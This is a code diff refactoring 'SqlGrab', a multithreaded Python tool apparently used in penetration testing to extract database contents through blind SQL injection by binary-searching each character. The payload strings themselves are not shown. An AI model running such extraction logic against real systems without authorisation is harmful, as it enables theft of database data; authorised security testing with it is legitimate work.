@@ -6,7 +6,9 @@ from concurrent.futures import ALL_COMPLETED, Future, ThreadPoolExecutor, wait
 from functools import partial
 from http.server import BaseHTTPRequestHandler
 from io import BytesIO
+from dataclasses import dataclass
 import time
+from queue import Queue
 import math
 import urllib.parse
 import urllib3
@@ -101,33 +103,27 @@ PROFILES = {
     'databricks': DATABRICKS_PAYLOADS
 }
 
-print_lock = threading.Lock()
 
+@dataclass
 class SqlGrab:
-    def __init__(
-            self,
-            request: Request,
-            dbms: Literal['mysql', 'mssql', 'oracle', 'postgresql', 'databricks'],
-            condition: str,
-            threads: int=1,
-            delay: float=0,
-            urlencode: bool=False,
-            sanity: bool=False,
-            proxy: str | None = None,
-            output: bool=False
-        ):
-        self.request = request
-        self.urlencode = urlencode
-        self.sanity_checking = sanity
-        self.threads = threads
-        self.delay = delay
-        self.payloads = PROFILES[dbms]
-        self.condition = condition
-        self.output=output
+    request: Request
+    dbms: Literal['mysql', 'mssql', 'oracle', 'postgresql', 'databricks']
+    condition: str
+    threads: int=1
+    delay: float=0
+    urlencode: bool=False
+    sanity: bool=False
+    proxy: str | None = None
+    output: bool=False
+    status: str = ''
+
+    def __post_init__(self):
+        self.payloads = PROFILES[self.dbms]
         self.proxy = {
-            'http': proxy,
-            'https': proxy
-        } if proxy else {}
+            'http': self.proxy,
+            'https': self.proxy
+        } if self.proxy else {}
+        self.executor = ThreadPoolExecutor(max_workers=self.threads)
 
     @classmethod
     def fromFile(
@@ -139,7 +135,8 @@ class SqlGrab:
         )
     
     @staticmethod
-    def _insert_query(payloads: dict, query: str) -> None:
+    def _insert_query(payloads: dict, query: str) -> dict[partial]:
+        ''' Replaces {query} in all payloads '''
         for k, v in payloads.items():
             if type(v) is dict:
                 payloads[k] = SqlGrab._insert_query(v, query=query)
@@ -155,129 +152,137 @@ class SqlGrab:
             payloads=self.payloads,
             query=query
         )
-        try:
-            print('[+] \x1B[90mDetermining Length...\x1B[0m', end='\r')
-            length = self._get_length()
-            return self._get_string(length)
-        except RuntimeError as e:
-            print('\n'+str(e))
-            exit()
-        except KeyboardInterrupt:
-            print('\n[!] Interrupted')
+        length = self._get_length()
+        result = self._get_string(length)
+        return result
 
     def _done(self, future: Future, payload: str) -> None:
         self._sanity_check(payload(guess=future.result()))
 
+    def _get_length(self) -> int:
+        payloads = self.payloads['length']
+
+        def update(c: SqlGrab.ValueGrabber.Context):
+            print(f'[+] \x1B[90mDetermining length (Between {c.min} and {c.max})\x1B[0m', end='\r')
+
+        progress_queue: Queue = Queue()
+        future = self.executor.submit(
+            self.ValueGrabber(
+                payload=payloads['>'],
+                eval_cb=self.evaluate,
+                progress=progress_queue
+            ).grab,
+            start=INITIAL_LENGTH
+        )
+
+        if self.output:
+            while not future.done() or not progress_queue.empty():
+                context: dict = progress_queue.get(block=True)
+                update(context)
+
+        length = future.result()
+        if self.sanity:
+            self._sanity_check(payloads['='](guess=length))
+        return length
+
     def _get_string(self, length: int):
-        results: list[tuple[str,bool]] = []
-        print('[+] \x1B[90mDetermining Length...\x1B[0m', end='\r')
         payloads = self.payloads['character']
+        results: list[SqlGrab.ValueGrabber.Context] = [
+            None for _ in range(length)
+        ]
 
-        def update(guess: int, index: int, working: bool) -> None:
-            results[index] = (guess, working)
-            output = '[+] '
+        def update(c: SqlGrab.ValueGrabber.Context):
+            results[c.task_id] = c
+            done = [i for i, f in enumerate(futures) if f.done()]
+            output = f'[+] \x1B[90m[{str(len(done))}/{str(len(results))}]\x1B[0m '
             for r in results:
-                value, working = r
                 output += (
-                    f'\x1B[90m-\x1B[0m' if value is None else
-                    f'\x1B[90m{chr(value)}\x1B[0m' if working else
-                    f'\x1b[32m{chr(value)}\x1B[0m'
+                    f'\x1B[90m-\x1B[0m' if r == None else
+                    f'\x1B[32m{chr(r.guess)}\x1B[0m' if r.task_id in done else
+                    f'\x1b[90m{chr(r.guess)}\x1B[0m'
                 )
-            with print_lock:
-                print(output + '\033[K', end='\r')
+            print(output + '\033[K', end='\r')
 
-        with ThreadPoolExecutor(max_workers=self.threads) as executor:
-            futures: list[Future] = []
-            for i in range(length):
-                payload = partial(payloads['>'], index=i + 1)
-                results.append((None, True))
-                future = executor.submit(
-                    self.ValueGrabber(
-                        payload=payload,
-                        eval_cb=self.evaluate,
-                        update_cb=update if self.output else None,
-                        update_index=i if self.output else None,
-                        range=(CHAR_MIN, CHAR_MAX)
-                    ).grab,
-                    start=INITIAL_CHAR
-                )
-                if self.sanity_checking:
-                    future.add_done_callback(partial(
-                        self._done, payload=partial(payloads['='], index=i + 1)
-                    ))
-                futures.append(future)
+        progress_queue: Queue = Queue()
+        futures: list[Future] = [
+            self.executor.submit(
+                self.ValueGrabber(
+                    payload=partial(payloads['>'], index=i + 1),
+                    eval_cb=self.evaluate,
+                    task_id=i,
+                    progress=progress_queue,
+                    range=(CHAR_MIN, CHAR_MAX)
+                ).grab,
+                start=INITIAL_CHAR
+            ) for i in range(length) 
+        ]
 
-            self.result = ''.join([chr(f.result()) for f in futures])
+        if self.sanity:
+            for i, f in enumerate(futures):
+                f.add_done_callback(partial(
+                    self._done,
+                    payload=partial(payloads['='], index=i + 1)
+                ))
         
-        if self.sanity_checking:
-            self._sanity_check(self.payloads['compare'](guess=self.result))
+        if self.output:
+            while not all(f.done() for f in futures) or not progress_queue.empty():
+                context: dict = progress_queue.get(block=True)
+                update(context)
+            print()
 
-        return self.result
+        result = ''.join([chr(f.result()) for f in futures])
+        
+        if self.sanity:
+            self._sanity_check(self.payloads['compare'](guess=result))
+
+        return result
     
     def _sanity_check(self, payload: str) -> None:
         is_equal = self.evaluate(payload)
         if not is_equal:
-            raise RuntimeError('[!] The result was invalid, either due to a syntax error or because no result exists. Send the requests to Repeater and sanity check them.')
+            raise RuntimeError('[!] The result was invalid, either due to a syntax error, too many threads, or because no result exists. Send the requests to Repeater and sanity check them.')
 
-    def _get_length(self) -> int:
-        payloads = self.payloads['length']
-        length = self.ValueGrabber(
-            payload=payloads['>'],
-            eval_cb=self.evaluate
-        ).grab(start=INITIAL_LENGTH)
-        if self.sanity_checking:
-            self._sanity_check(payloads['='](guess=length))
-        return length
 
+    @dataclass
     class ValueGrabber:
-        def __init__(
-                self,
-                payload: Callable,
-                eval_cb: Callable, 
-                update_cb: Callable|None=None,
-                update_index: int|None=None,
-                range: tuple[int,int]=(0,math.inf)
-            ):
-            self.payload = payload
-            self.eval_cb = eval_cb
-            self.update_func = update_cb
-            self.update_index = update_index
-            self.range = range
-            self.working: bool = False
+        payload: partial
+        eval_cb: Callable 
+        task_id: int | None = None
+        progress: Queue | None = None
+        range: tuple[int,int] = (0,math.inf)
+
+        @dataclass
+        class Context:
+            task_id: int
+            min: int
+            max: int
+            guess: int
 
         def grab(self, start: int) -> int:
-            self.guess: int = start
-            self.working = True
-            return self._get_value(self.range)
+            return self._get_value(start, self.range)
 
-        def _get_value(self, range=(0, math.inf)) -> int:
+        def _get_value(self, guess: int, range=(0, math.inf)) -> int:
             ''' Determines the value of a variable based on iterative halving/doubling of the search space '''
-
-            self.min, self.max = range
-
-            while self.min != self.max:
+            min, max = range
+            while min != max:
                 is_bigger = self.eval_cb(
-                    self.payload(guess=self.guess)
+                    self.payload(guess=guess)
                 )
                 if is_bigger:
-                    self.min = self.guess + 1
+                    min = guess + 1
                 else:
-                    self.max = self.guess
+                    max = guess
 
-                if self.max == math.inf: # double value to find upper bound if not already found
-                    self.guess *= 2
+                if max == math.inf: # double value to find upper bound if not already found
+                    guess *= 2
                 else: # narrow down between that range
-                    self.guess = self.min + int((self.max - self.min) / 2)
-                if self.guess > 2**32:
+                    guess = min + int((max - min) / 2)
+                if guess > 2**32:
                     raise RuntimeError('[!] An upper bound on the output length could not be found. Maybe a syntax error?')
                 
-                if self.update_func:
-                    self.update_func(self.guess, self.update_index, self.working)
-
-            self.working = False
-            if self.update_func:
-                self.update_func(self.guess, self.update_index, self.working)
-            return self.guess
+                if self.progress:
+                    self.progress.put(self.Context(self.task_id, min, max, guess))
+            return guess
 
     @staticmethod
     def urlEncode(text: str) -> str:
@@ -379,9 +384,14 @@ if __name__ == "__main__":
 
     args = vars(parser.parse_args())
     q = args.pop('query')
-    grabber = SqlGrab.fromFile(
+    grabber: SqlGrab = SqlGrab.fromFile(
         **args,
         output=True
     )
-    result = grabber.grab(q)
-    print(f'[+] \x1b[32m{result}\x1B[0m')
+    try:
+        grabber.grab(q)
+    except RuntimeError as e:
+        print('\n'+str(e))
+        exit()
+    except KeyboardInterrupt:
+        print('\n[!] Interrupted')
